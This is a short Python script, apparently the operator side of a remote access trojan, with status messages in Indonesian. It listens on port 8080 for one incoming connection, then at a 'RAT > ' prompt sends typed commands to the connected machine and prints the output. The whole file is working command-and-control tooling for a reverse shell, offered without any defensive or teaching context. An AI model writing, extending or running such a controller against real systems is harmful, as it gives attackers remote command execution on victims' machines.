import socket

HOST = '0.0.0.0'
PORT = 8080

s = socket.socket()
s.bind((HOST, PORT))
s.listen(1)

print(f"[+] Menunggu koneksi di port {PORT}...")
conn, addr = s.accept()
print(f"[+] Terhubung dari {addr}")

while True:
    command = input("RAT > ")
    if command.strip() == "":
        continue
    conn.send((command + "\n").encode())
    result = conn.recv(4096).decode(errors="ignore")
    print(result)
